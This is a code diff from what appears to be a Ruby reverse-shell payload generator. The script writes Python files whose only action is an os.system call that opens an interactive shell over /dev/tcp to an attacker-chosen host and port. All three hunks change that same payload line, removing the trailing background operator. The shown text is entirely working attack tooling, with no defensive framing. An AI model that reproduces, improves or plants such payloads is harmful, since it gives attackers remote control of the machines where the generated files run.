@@ -64,7 +64,7 @@ if File.directory? file
             sleep(0.5)
             open(file, 'w') { |f|
                 f.puts "import os"
-                f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\")"
+                f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\")"
             }
             puts "#{s}Saved to #{file}!"
         else
@@ -76,7 +76,7 @@ if File.directory? file
             sleep(0.5)
             open(file, 'w') { |f|
                 f.puts "import os"
-                f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\")"
+                f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\")"
             }
             puts "#{s}Saved to #{file}!"
         end
@@ -102,7 +102,7 @@ else
             sleep(0.5)
             open(file, 'w') { |f|
                 f.puts "import os"
-                f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\")"
+                f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\")"
             }
             puts "#{s}Saved to #{file}!"
         else
